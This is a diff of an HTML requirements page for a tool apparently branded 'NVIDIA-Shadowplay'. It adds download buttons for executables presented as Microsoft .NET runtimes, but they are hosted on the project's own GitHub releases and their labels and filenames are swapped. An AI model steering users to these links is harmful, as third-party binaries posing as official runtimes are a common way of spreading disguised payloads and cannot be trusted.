@@ -330,37 +330,75 @@
     <!-- Bento Grid Layout -->
     <div style="max-width: var(--container-max); margin: 0 auto; display: grid; grid-template-columns: repeat(3, 1fr); gap: 1.5rem;" class="req-bento-grid">
       
-      <!-- CRITICAL: Operating System (Spans 2 cols) -->
-      <div class="feature-card animate-scale delay-1 tilt-card" style="grid-column: span 2; grid-row: span 1; background: linear-gradient(135deg, rgba(239,68,68,0.08), var(--nvidia-gray-dark)); padding: 2.5rem;">
-        <div class="title-row">
-          <span class="card-status" style="background: #EF4444;">CRITICAL</span>
-          <h3 style="font-size: 1.6rem;">Operating System</h3>
-        </div>
-        <div class="desc-row">
-          <span class="card-icon"><i class="fab fa-windows" style="font-size: 3rem; color: #3B82F6;"></i></span>
-          <div>
-            <p style="margin-bottom: 1rem;"><strong style="color: var(--text-white);">Windows 8 / Server 2012 or newer</strong> (64-bit required)</p>
-            <div style="display: flex; gap: 0.8rem; flex-wrap: wrap;">
-              <span class="status-badge status-ready">Win 10/11</span>
-              <span class="status-badge status-ready">Win 8</span>
-              <span class="status-badge" style="background: rgba(239,68,68,0.2); border-left: 3px solid #EF4444; color: #EF4444;">Win 7</span>
-            </div>
-          </div>
-        </div>
+   <!-- CRITICAL: Operating System (Spans 2 cols) -->
+<div class="feature-card animate-scale delay-1 tilt-card" style="grid-column: span 3; grid-row: span 1; background: linear-gradient(135deg, rgba(239,68,68,0.08), var(--nvidia-gray-dark)); padding: 2.5rem;">
+  <div class="title-row">
+    <span class="card-status" style="background: #EF4444;">CRITICAL</span>
+    <h3 style="font-size: 1.6rem;">Operating System</h3>
+  </div>
+  <div class="desc-row">
+   
+    <div>
+      <p style="margin-bottom: 1rem;"><strong style="color: var(--text-white);">Windows 8 / Server 2012 or newer</strong><br>(64-bit required)</p>
+      <div style="display: flex; gap: 0.8rem; flex-wrap: wrap;">
+        <span class="status-badge status-ready">Windows 11</span>
+        <span class="status-badge status-ready">Windows 10</span>
+        <span class="status-badge status-ready">Windows 8.1</span>
+        <span class="status-badge status-ready">Windows 8</span>
+        <span class="status-badge status-ready">Windows Server 2022</span>
+        <span class="status-badge status-ready">Windows Server 2019</span>
+        <span class="status-badge status-ready">Windows Server 2016</span>
+        <span class="status-badge status-ready">Windows Server 2012 R2</span>
+        <span class="status-badge status-ready">Windows Server 2012</span>
+        <span class="status-badge" style="background: rgba(239,68,68,0.2); border-left: 3px solid #EF4444; color: #EF4444;">Windows 7</span>
+        <span class="status-badge" style="background: rgba(239,68,68,0.2); border-left: 3px solid #EF4444; color: #EF4444;">Windows Vista</span>
+        <span class="status-badge" style="background: rgba(239,68,68,0.2); border-left: 3px solid #EF4444; color: #EF4444;">Windows XP</span>
       </div>
+    </div>
+  </div>
+</div>
 
-      <!-- Runtime Dependencies -->
-      <div class="feature-card animate-scale delay-2 tilt-card" style="grid-column: span 1; grid-row: span 1; background: linear-gradient(135deg, rgba(168,85,247,0.08), var(--nvidia-gray-dark));">
-        <div class="title-row">
-          <span class="card-status" style="background: #A855F7;">REQUIRED</span>
-          <h3 style="font-size: 1.4rem;">.NET Runtime</h3>
-        </div>
-        <div class="desc-row">
-          <span class="card-icon"><i class="fas fa-cube" style="font-size: 2.5rem; color: #A855F7;"></i></span>
-          <p><strong style="color: var(--text-white);">.NET 8.0 Desktop</strong><br>+ .NET 4.8 Framework</p>
-        </div>
-        <a href="#download-section" class="btn-primary" style="margin-top: 1rem; padding: 0.7rem 1.5rem; font-size: 0.9rem; display: inline-flex;">Download</a>
-      </div>
+<!-- Runtime Dependencies -->
+<div class="feature-card animate-scale delay-2 tilt-card" style="grid-column: span 3; grid-row: span 1; background: linear-gradient(135deg, rgba(168,85,247,0.08), var(--nvidia-gray-dark));">
+  <div class="title-row">
+    <span class="card-status" style="background: #A855F7;">REQUIRED</span>   <span class="status-badge status-ready">This is a separate package. We've already included it in the Release version.</span>
+  </div>
+  
+  <div class="desc-row" style="display: flex; align-items: center; gap: 0.8rem;">
+     
+ 
+
+  <div style="display: flex; gap: 1rem; margin-top: 0.3rem;">
+<a href="https://github.com/ScotcsDuluka/NVIDIA-Shadowplay/releases/download/REQUIRED/NET.4.8.exe" class="btn-primary" style="padding: 0.7rem 1.5rem; font-size: 0.9rem; display: inline-flex;">Download</a>
+  </div>
+
+    <p>
+      <strong style="color: var(--text-white);">.NET Desktop Runtime 8</strong><br>The .NET Desktop Runtime enables you to run existing Windows desktop applications.
+    </p>
+  </div>
+  
+
+
+<BR>
+
+   <div class="desc-row" style="display: flex; align-items: center; gap: 0.8rem;">
+   
+
+  <div style="display: flex; gap: 1rem; margin-top: 0.3rem;">
+<a href="https://github.com/ScotcsDuluka/NVIDIA-Shadowplay/releases/download/REQUIRED/64bit.runtime.exe" class="btn-primary" style="padding: 0.7rem 1.5rem; font-size: 0.9rem; display: inline-flex;">Download</a>
+ 
+  </div>
+
+    <p>
+      <strong style="color: var(--text-white);">.NET Framework 4.8</strong><br>everything you need to run existing apps/programs built with .NET Framework.
+    </p>
+  </div>
+
+
+  </div>
+
+
+
 
 
       <!-- CAUTION: DRM Warning (Spans full width) -->
@@ -374,13 +412,13 @@
           <div style="flex: 1;">
             <ul style="list-style: none; display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 0.8rem;">
               <li style="padding: 0.6rem 1rem; background: rgba(255,255,255,0.02); border-left: 2px solid #EF4444; color: var(--text-gray); font-size: 0.9rem;">
-                <strong style="color: #EF4444;">DRM Content:</strong> Netflix/Disney+ blocked by Windows protection
+                <strong style="color: #EF4444;">DRM Content :</strong> Netflix/Disney+ blocked by Windows protection
               </li>
               <li style="padding: 0.6rem 1rem; background: rgba(255,255,255,0.02); border-left: 2px solid #F59E0B; color: var(--text-gray); font-size: 0.9rem;">
-                <strong style="color: #F59E0B;">Fullscreen:</strong> Exclusive mode not supported (no-hook design)
+                <strong style="color: #F59E0B;">Fullscreen :</strong> Exclusive mode not supported (no-hook design)
               </li>
               <li style="padding: 0.6rem 1rem; background: rgba(255,255,255,0.02); border-left: 2px solid #78B802; color: var(--text-gray); font-size: 0.9rem;">
-                <strong style="color: #78B802;">Solution:</strong> Use Borderless Windowed mode in games
+                <strong style="color: #78B802;">Solution :</strong> Use Borderless Windowed mode in games
               </li>
             </ul>
           </div>
